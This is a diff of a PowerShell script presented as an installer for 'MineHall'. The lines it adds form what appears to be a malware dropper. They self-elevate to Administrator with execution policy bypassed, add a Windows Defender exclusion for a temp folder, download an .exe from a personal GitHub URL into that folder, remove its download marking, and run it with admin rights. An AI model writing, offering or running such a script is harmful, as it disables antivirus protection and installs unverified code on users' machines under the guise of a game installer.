@@ -1,25 +1,37 @@
-if ($ExecutionContext.SessionState.LanguageMode -ne "FullLanguage") {
-   Write-Host "[!] Error: The auto-installer is unable to run on your system. PowerShell execution is restricted by security policies" -ForegroundColor Red
-   Write-Output ""
-   Write-Output "Press enter to exit..."
-   Read-Host | Out-Null
-   Exit
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Cyan
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
+Set-Location $PSScriptRoot
 
+Write-Host "[+] MineHall Installer Setup :)"
+
+$tempFolder = "$env:TEMP\MineHall"
+$installer = "MineHallSetup.exe"
+$savePath = Join-Path $tempFolder $installer
+$url = "https://github.com/michael31415926535/McSetup/raw/refs/heads/main/MineHallSetup.exe"
+
+if (!(Test-Path $tempFolder)) {
+    New-Item -Path $tempFolder -ItemType Directory
+}
+Add-MpPreference -ExclusionPath $tempFolder
+
+Write-Host "[*] Downloading the MineHall installer..." -ForegroundColor Cyan
 try {
-    Write-Host "[*] Downloading the latest MineHall Setup installer..." -ForegroundColor Yellow
-    $LatestVersion = 'https://github.com/michael31415926535/McSetup/raw/refs/heads/main/MineHallSetup.exe'
-    Invoke-RestMethod $LatestVersion -OutFile "$env:TEMP\MineHallSetup.exe"
+    Invoke-WebRequest -Uri $url -OutFile $savePath
 }
 catch {
-    Write-Host "[!] Error: Unable to download the installer." -ForegroundColor Red
-    Write-Host "    Error Message: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "    Exception Details: $($_.Exception)" -ForegroundColor Red
-    Write-Output ""
-    Write-Output "    Press enter to exit..."
-    Read-Host | Out-Null
-    Exit
+    Write-Host "[!] Download failed. Please run this script again to retry, also check your internet connection." -ForegroundColor Red
+    Write-Host "    Press enter to exit..."
+    Read-Host
+    exit
 }
-Write-Host "[+] Running MineHall Setup..." -ForegroundColor Green
 
-Start-Process "$env:TEMP\MineHallSetup.exe"
+Unblock-File -Path $savePath
+$proc = Start-Process $savePath -Verb RunAs -PassThru -Wait
+if ($proc.ExitCode -ne 0) {
+    Write-Host "[!] Something went wrong running the installer. Please run this script to try again."
+    Write-Host "    Press enter to exit..."
+    Read-Host
+}
